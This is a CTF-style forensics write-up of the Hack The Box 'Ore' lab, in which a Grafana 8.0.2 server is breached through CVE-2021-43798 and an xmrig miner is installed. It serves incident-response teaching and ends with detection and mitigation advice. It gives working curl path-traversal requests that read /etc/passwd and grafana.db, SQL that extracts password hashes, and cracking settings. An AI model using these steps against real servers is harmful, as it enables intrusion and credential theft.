---
sherlock: Ore
difficulty: Medium
category: DFIR
platform: Hack The Box
state: Unverified
tags: [dfir, linux, grafana, cve-2021-43798, path-traversal, cryptominer, xmrig]
---

# Ore — Hack The Box Sherlock

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Pending confirmation on HTB without a session; reference writeup, not played.
> No flags, credentials, wallet addresses or real IPs.

## TL;DR

A server running **Grafana 8.0.2** is vulnerable to **CVE-2021-43798**, a path traversal in the plugins endpoint. The attacker reads `/etc/passwd` and the `grafana.db` database, obtains credentials and logs into the panel. They then deploy a miner (`xmrig`) and leave persistence. The investigation combines Grafana logs, processes, cron/systemd and network traffic.

## Recon

```bash
nmap -Pn -sCV -p 3000,22 <TARGET_IP>
curl -s http://<TARGET_IP>:3000/api/health
```

Confirm the version in `/api/health` or the login footer. If it is 8.0.2 (or any 8.x before 8.3.1), the traversal is present.

## 1. Path traversal

```bash
curl --path-as-is \
  'http://<TARGET_IP>:3000/public/plugins/alertlist/../../../../../../etc/passwd'
```

The endpoint does not normalise `..` and lets you escape the plugins directory. To read the database:

```bash
curl --path-as-is \
  'http://<TARGET_IP>:3000/public/plugins/alertlist/../../../../../../var/lib/grafana/grafana.db' \
  -o grafana.db
file grafana.db
```

Common paths: `/var/lib/grafana/grafana.db`, `/etc/grafana/grafana.ini`, `/var/lib/grafana/plugins/`. The session signing key may also be readable from the `.ini`.

## 2. Credentials

```bash
sqlite3 grafana.db '.tables'
sqlite3 grafana.db 'select id,login,password,salt,is_admin from user;'
```

Grafana stores `PBKDF2-HMAC-SHA256(password, salt, 10000)`. Crack offline with hashcat mode `10900` and a wordlist; do not publish hashes or passwords.

With an admin account, open the panel and review:

- `Data sources` with database credentials.
- `API keys` and created users.
- Panels and annotations containing commands or URLs.
- `Server admin` → `Settings` to read configuration.

## 3. Access and persistence

```bash
ssh <USER>@<TARGET_IP>
ps auxww | grep -iE 'xmrig|miner|catscale'
crontab -l
systemctl list-units --type=service --state=running
```

- `xmrig` usually runs from `/tmp`, `/dev/shm` or a user folder, with `--donate-level 1` and an external pool.
- Review `~/.bashrc`, `~/.profile`, `/etc/cron.*`, `systemd` and `authorized_keys`.
- `CatScale` is the name associated with the deployment observed in the case; treat it as an artefact without inventing its function.

## 4. Network

```bash
ss -tupna
grep -RInE 'stratum|pool|wallet' /etc /var/lib/grafana 2>/dev/null
```

Record the pool as `<POOL_HOST>:<PORT>` and the wallet as `<WALLET>`; do not copy real values. The connection pattern and process are the evidence, not the address.

## 5. Timeline

| Time (UTC) | Event |
|---|---|
| T0 | Request to `/public/plugins/alertlist/../../..` |
| T0+1m | `grafana.db` read |
| T0+5m | Admin login |
| T0+10m | `xmrig` download |
| T0+12m | Cron/systemd persistence |
| T0+15m | Pool connection |

## Lessons learned

- Grafana exposes a lot in its SQLite database; traversal turns a read flaw into full compromise.
- Check the version before assuming the CVE.
- A miner is detected by CPU, process and pool connection, not just its name.
- Linux persistence usually lives in cron, systemd, `.bashrc` and SSH keys.
- Do not publish wallets or credentials: they belong to third parties.

## Mitigations and detection

- Upgrade Grafana to a fixed version (8.3.1 or later in a supported branch).
- Restrict `/public/plugins/` and normalise paths at the proxy.
- Alert on requests containing `..` to `/public/plugins/`, reads of `grafana.db` and high-CPU processes.
- Monitor mining-pool connections and new systemd services.
- Rotate Grafana and data-source credentials; review API keys.

MITRE: T1190, T1003, T1496, T1053.003.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2021-43798>
- <https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/>
- <https://mwalkowski.com/post/sherlock-ore>
